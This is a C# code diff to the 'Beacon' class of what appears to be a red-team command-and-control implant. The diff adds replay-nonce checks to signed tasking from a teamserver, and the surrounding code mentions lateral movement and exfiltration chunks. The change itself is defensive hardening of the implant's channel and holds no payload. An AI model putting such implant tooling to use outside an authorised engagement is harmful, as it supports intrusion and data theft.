@@ -47,6 +47,11 @@ internal sealed class Beacon
     private readonly IReadOnlyList<string> _classVerbs;
     private readonly TextWriter _log;
 
+    // The replay-nonce state (architecture.md Sec 9 -- tasking replay nonces):
+    // the accepted-nonce floor spans the implant's whole run, so a captured
+    // frame replayed after a reconnect still falls at or below it.
+    private readonly TaskNonceTracker _nonces = new();
+
     /// <summary>
     /// Builds a Beacon whose handler registry carries no enroll bundle, so the
     /// lateral.move handler reports derivation as unavailable.
@@ -208,6 +213,12 @@ internal sealed class Beacon
         {
             Version = new ProtocolVersion { Major = 1, Minor = 0 },
             ImplantId = _implantId,
+            // Advertise the replay-nonce arm (architecture.md Sec 9): when the
+            // server echoes it, every dispatched task carries a per-implant
+            // monotonic nonce covered by the signature, and tasking without
+            // one is refused. A server that does not echo keeps the nonce-less
+            // shape, and verification falls back to the original tuple.
+            ReplayNonces = true,
         };
         handshake.Capabilities.Add(_handlers.AdvertisedVerbs(_classVerbs));
         await call.RequestStream.WriteAsync(new Frame { Payload = ByteString.CopyFrom(handshake.ToByteArray()) });
@@ -224,7 +235,8 @@ internal sealed class Beacon
             _log.WriteLine($"handshake refused: {hs.Status}; terminating");
             return BeaconCycleResult.Terminal;
         }
-        _log.WriteLine($"handshake ok: engagement={hs.EngagementId}");
+        _nonces.Negotiated = hs.ReplayNonces;
+        _log.WriteLine($"handshake ok: engagement={hs.EngagementId}, replay-nonces={hs.ReplayNonces}");
 
         // Tasking loop: read TaskRequest downstream, dispatch, write TaskResult
         // up. Stream mode blocks until the server closes; poll mode drains the
@@ -262,17 +274,29 @@ internal sealed class Beacon
                 var task = TaskRequest.Parser.ParseFrom(frame.Payload);
 
                 // Command signing (architecture.md Sec 9): verify the teamserver's
-                // signature before any handler runs. A task that fails verification
-                // is reported Failed with the cause -- the operator sees the
-                // rejection on the task itself -- and nothing executes.
+                // signature before any handler runs, and -- once the replay-nonce
+                // arm is live -- that the task's nonce advances the accepted
+                // floor. A task that fails either is reported Failed with the
+                // cause -- the operator sees the rejection on the task itself,
+                // so a replayed frame surfaces as a refused task -- and nothing
+                // executes.
                 TaskOutcome outcome;
                 string output;
                 IReadOnlyList<ExfilChunk> chunks;
-                if (!TaskingVerifier.Verify(_implantId, task, _cas))
+                var verdict = TaskingVerifier.Verify(_implantId, task, _cas, _nonces);
+                if (verdict != TaskingVerdict.Accepted)
                 {
-                    _log.WriteLine($"task {task.TaskId} rejected: signature verification failed");
+                    var cause = verdict switch
+                    {
+                        TaskingVerdict.RejectedReplay =>
+                            $"task rejected: replayed tasking (nonce {task.TaskNonce} at or below the accepted floor); not executed",
+                        TaskingVerdict.RejectedNoNonce =>
+                            "task rejected: no task nonce after the replay-nonce handshake; not executed",
+                        _ => "task rejected: signature verification failed; not executed",
+                    };
+                    _log.WriteLine($"task {task.TaskId} rejected: {verdict}");
                     outcome = TaskOutcome.Failed;
-                    output = "task rejected: signature verification failed; not executed";
+                    output = cause;
                     chunks = Array.Empty<ExfilChunk>();
                 }
                 else if (_handlers.ChannelFor(task.Verb) is { } channelHandler)
